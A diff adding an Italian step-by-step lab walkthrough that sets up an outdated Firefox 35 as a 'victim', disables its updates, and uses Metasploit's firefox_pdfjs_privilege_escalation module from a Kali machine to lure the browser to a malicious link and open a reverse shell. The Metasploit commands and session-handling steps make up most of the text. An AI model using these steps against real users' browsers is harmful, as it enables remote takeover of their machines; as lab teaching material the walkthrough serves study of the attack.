@@ -1,0 +1,35 @@
+1) Estraete sulla vittima Firefox versione 35 al seguente link:
+  https://ftp.mozilla.org/pub/firefox/releases/35.0/linux-x86_64/it/firefox-35.0.tar.bz2
+
+2) Dopo aver avviato Firefox si devono disattivare gli aggiornamenti automatici dalle Preferenze per evitare che l'attacco non funzioni più:
+
+3) Settare come visualizzatore PDF default quello di Firefox da Preferenze->Visualizzazione PDF->Anteprima Firefox
+
+4) Avviare sulla macchina dell'attaccante Kali con metasploit aggiornato ed eseguire i seguenti comandi:
+
+  $ use exploit/multi/browser/firefox_pdfjs_privilege_escalation
+  
+  $ set lhost 192.168.1.103 (indirizzo ip dell'attaccante)
+
+  $ set srvhost 192.168.1.103 (indirizzo ip dell'attaccante)
+
+  $ set srvport 8888 
+  
+  $ exploit
+  
+  > qui metasploit genererà un link a cui la vittima dovra collegarsi attraverso firefox
+  
+5) Nella vittima inserire nella barra degli indirizzi di Firefox l'indirizzo generato da Kali; si verra reindirizzati in una pagina
+   che invita a cliccare su di un testo e quindi cliccate su tale testo.
+
+6) Se tutto è stato eseguito correttamente, sulla macchina dell'attaccante sarà stata aperta una sessione di reverse shell;
+   inserite in metasploit i seguenti comandi:
+   
+   $ sessions 
+   
+   > saranno listate tutte le sessioni aperte; 
+   
+   $ sessions -i id_ultima_sessione_disponibile
+
+7) Se l'attacco è andato a buon fine si avrà la shell della vittima
+
